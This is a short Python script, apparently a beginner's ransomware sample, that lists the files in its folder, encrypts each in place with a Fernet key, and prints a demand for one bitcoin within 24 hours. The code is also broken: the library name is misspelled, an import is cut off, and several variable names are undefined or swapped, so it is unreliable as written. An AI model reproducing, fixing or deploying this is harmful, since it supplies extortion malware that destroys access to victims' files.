import os

from cyptography.fernet import 

#finding files

files =[]

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key=Fernet.generate_key()

with open("thekey.key", "rb") as key:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(tkey).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print("All of your files have been encrypted! Send me 1 bitcoin in 24h or I will delete them")
